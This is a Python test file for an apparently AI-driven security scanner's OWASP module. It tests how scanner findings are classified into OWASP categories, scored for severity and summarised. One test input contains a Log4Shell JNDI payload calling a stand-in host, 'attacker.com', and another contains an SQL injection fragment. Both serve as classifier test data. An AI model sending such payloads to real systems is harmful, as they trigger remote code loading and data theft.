from __future__ import annotations

from airecon.proxy.agent.owasp import (
    classify_owasp,
    evidence_risk_summary,
    owasp_label,
    remediation_for_owasp,
    cwe_for_owasp,
    severity_for_evidence,
    severity_label,
)


# ── classify_owasp — keyword matching ────────────────────────────────────────

def test_classify_sqli_by_keyword():
    tags = classify_owasp("SQL injection found in login form", [], "sqlmap")
    assert "owasp:A03:2021" in tags


def test_classify_xss_by_keyword():
    tags = classify_owasp("Reflected XSS vulnerability detected", [], "dalfox")
    assert "owasp:A03:2021" in tags


def test_classify_ssrf_by_keyword():
    tags = classify_owasp("SSRF via Host header redirect to internal network", [], "execute")
    assert "owasp:A10:2021" in tags


def test_classify_ssrf_by_tag():
    tags = classify_owasp("Server returned 200", ["ssrf"], "execute")
    assert "owasp:A10:2021" in tags


def test_classify_cve_by_keyword():
    tags = classify_owasp("CVE-2023-12345 detected in component", [], "nuclei")
    assert "owasp:A06:2021" in tags


def test_classify_auth_bypass_by_keyword():
    tags = classify_owasp("Auth bypass found via JWT manipulation", [], "execute")
    assert "owasp:A07:2021" in tags


def test_classify_misconfiguration_by_keyword():
    tags = classify_owasp("Directory listing enabled on /uploads", [], "httpx")
    assert "owasp:A05:2021" in tags


def test_classify_broken_access_by_tag():
    tags = classify_owasp("Access to restricted resource", ["idor"], "execute")
    assert "owasp:A01:2021" in tags


def test_classify_crypto_failure_by_keyword():
    tags = classify_owasp("Weak cipher detected in TLS handshake", [], "testssl")
    assert "owasp:A02:2021" in tags


def test_classify_no_match_returns_empty():
    tags = classify_owasp("Port 80 is open", [], "nmap")
    assert tags == []


def test_classify_multiple_categories():
    tags = classify_owasp("SQL injection CVE-2022-9999 found in parameter", [], "sqlmap")
    assert "owasp:A03:2021" in tags
    assert "owasp:A06:2021" in tags


def test_classify_no_duplicate_tags():
    tags = classify_owasp("XSS detected", ["xss"], "dalfox")
    assert tags.count("owasp:A03:2021") == 1


def test_classify_rce_keyword():
    tags = classify_owasp("Remote code execution via deserialization gadget", [], "execute")
    assert "owasp:A03:2021" in tags


def test_classify_log4shell():
    tags = classify_owasp("log4shell confirmed via ${jndi:ldap://attacker.com}", [], "nuclei")
    assert "owasp:A03:2021" in tags
    assert "owasp:A06:2021" in tags


def test_classify_bola_api():
    tags = classify_owasp("BOLA: cross-account access confirmed on /api/orders/456", [], "burp")
    assert "owasp:API1:2023" in tags


def test_classify_mass_assignment():
    tags = classify_owasp("Mass assignment vulnerability — is_admin field accepted", [], "ffuf")
    assert "owasp:API3:2023" in tags or "owasp:A01:2021" in tags


def test_classify_bfla():
    tags = classify_owasp("BFLA: admin API endpoint accessible with regular user token", [], "burp")
    assert "owasp:API5:2023" in tags


# ── classify_owasp — negative keyword exclusion ───────────────────────────────

def test_negative_keyword_suppresses_match_in_context():
    # "no sql injection found" — negative word in context should suppress
    tags = classify_owasp("Scanner result: no sql injection found in parameter", [], "sqlmap")
    assert "owasp:A03:2021" not in tags


def test_negative_keyword_does_not_suppress_unrelated_match():
    # Negative for A03 but A10 (SSRF) is still valid
    tags = classify_owasp("No sql injection found, but SSRF confirmed via metadata endpoint", [], "nuclei")
    assert "owasp:A03:2021" not in tags
    assert "owasp:A10:2021" in tags


def test_negative_keyword_patched_suppresses():
    tags = classify_owasp("CVE-2023-1234 — patched in version 2.0.1", [], "nuclei")
    assert "owasp:A06:2021" not in tags


def test_negative_keyword_not_vulnerable_suppresses():
    tags = classify_owasp("Target not vulnerable to SSRF, internal requests blocked", [], "ffuf")
    assert "owasp:A10:2021" not in tags


def test_negative_keyword_far_from_match_does_not_suppress():
    # Negative word is 300+ chars away from the match — should NOT suppress
    far_text = "SQL injection confirmed in login form. " + "x" * 300 + " Not relevant: patched elsewhere."
    tags = classify_owasp(far_text, [], "sqlmap")
    assert "owasp:A03:2021" in tags


def test_high_confidence_keyword_bypasses_negative():
    # High-confidence match should not be suppressed even with negative words nearby
    tags = classify_owasp("union select null — not vulnerable to basic injection but confirmed", [], "sqlmap")
    assert "owasp:A03:2021" in tags


# ── severity_for_evidence ─────────────────────────────────────────────────────

def test_severity_rce_is_critical():
    sev = severity_for_evidence("Remote code execution via RCE payload", [], 0.9)
    assert sev == 5


def test_severity_sqli_high():
    sev = severity_for_evidence("SQL injection in login endpoint", [], 0.85)
    assert sev >= 4


def test_severity_ssrf_high():
    sev = severity_for_evidence("SSRF via internal metadata endpoint", ["ssrf"], 0.8)
    assert sev == 4


def test_severity_misconfiguration_low():
    sev = severity_for_evidence("Default credentials found on admin panel", [], 0.7)
    assert sev == 2


def test_severity_low_confidence_penalty():
    sev_high_conf = severity_for_evidence("SQL injection detected", [], 0.9)
    sev_low_conf = severity_for_evidence("SQL injection detected", [], 0.4)
    assert sev_low_conf == sev_high_conf - 1


def test_severity_no_match_returns_info():
    sev = severity_for_evidence("Port 443 is open", [], 0.7)
    assert sev == 1


def test_severity_clamps_minimum_at_1():
    sev = severity_for_evidence("random text with no signals", [], 0.1)
    assert sev >= 1


def test_severity_clamps_maximum_at_5():
    sev = severity_for_evidence("rce confirmed xss confirmed ssrf confirmed sqli confirmed", [], 0.99)
    assert sev <= 5


def test_severity_high_confidence_boosts():
    # "rce confirmed" is a high_confidence_keyword → should boost base_severity+1
    sev_hc = severity_for_evidence("rce confirmed — command executed on target", [], 0.95)
    sev_reg = severity_for_evidence("remote code execution possible", [], 0.95)
    assert sev_hc >= sev_reg


def test_severity_negative_no_false_positive():
    sev = severity_for_evidence("No SQL injection found in all parameters", [], 0.9)
    # Should be Info since negative keyword suppresses
    assert sev == 1


# ── owasp_label ───────────────────────────────────────────────────────────────

def test_owasp_label_known():
    label = owasp_label("owasp:A03:2021")
    assert "Injection" in label
    assert "A03:2021" in label


def test_owasp_label_api():
    label = owasp_label("owasp:API1:2023")
    assert "Broken Object Level" in label


def test_owasp_label_unknown_passthrough():
    label = owasp_label("owasp:A99:2021")
    assert label == "owasp:A99:2021"


# ── remediation_for_owasp ─────────────────────────────────────────────────────

def test_remediation_returns_list():
    rem = remediation_for_owasp("owasp:A03:2021")
    assert isinstance(rem, list)
    assert len(rem) > 0


def test_remediation_unknown_returns_empty():
    rem = remediation_for_owasp("owasp:A99:2021")
    assert rem == []


# ── cwe_for_owasp ─────────────────────────────────────────────────────────────

def test_cwe_returns_list():
    cwes = cwe_for_owasp("owasp:A03:2021")
    assert isinstance(cwes, list)
    assert any("CWE-" in c for c in cwes)


def test_cwe_unknown_returns_empty():
    cwes = cwe_for_owasp("owasp:A99:2021")
    assert cwes == []


# ── severity_label ────────────────────────────────────────────────────────────

def test_severity_label_5():
    assert severity_label(5) == "Critical"

def test_severity_label_4():
    assert severity_label(4) == "High"

def test_severity_label_3():
    assert severity_label(3) == "Medium"

def test_severity_label_2():
    assert severity_label(2) == "Low"

def test_severity_label_1():
    assert severity_label(1) == "Info"

def test_severity_label_unknown():
    assert severity_label(0) == "Info"


# ── evidence_risk_summary ─────────────────────────────────────────────────────

def test_risk_summary_empty():
    result = evidence_risk_summary([])
    assert result["total_evidence"] == 0
    assert result["high_or_critical"] == 0


def test_risk_summary_counts_severity():
    evidence = [
        {"severity": 5, "tags": ["owasp:A03:2021"]},
        {"severity": 4, "tags": ["owasp:A10:2021"]},
        {"severity": 2, "tags": []},
        {"severity": 1, "tags": []},
    ]
    result = evidence_risk_summary(evidence)
    assert result["severity_distribution"]["Critical"] == 1
    assert result["severity_distribution"]["High"] == 1
    assert result["severity_distribution"]["Low"] == 1
    assert result["severity_distribution"]["Info"] == 1
    assert result["high_or_critical"] == 2


def test_risk_summary_top_owasp():
    evidence = [
        {"severity": 4, "tags": ["owasp:A03:2021", "xss"]},
        {"severity": 4, "tags": ["owasp:A03:2021"]},
        {"severity": 3, "tags": ["owasp:A10:2021"]},
    ]
    result = evidence_risk_summary(evidence)
    top = result["top_owasp_categories"]
    assert top[0]["id"] == "owasp:A03:2021"
    assert top[0]["count"] == 2


def test_risk_summary_total_evidence():
    evidence = [{"severity": 1, "tags": []}] * 7
    result = evidence_risk_summary(evidence)
    assert result["total_evidence"] == 7


def test_risk_summary_all_critical():
    evidence = [{"severity": 5, "tags": ["owasp:A03:2021"]}] * 3
    result = evidence_risk_summary(evidence)
    assert result["severity_distribution"]["Critical"] == 3
    assert result["high_or_critical"] == 3
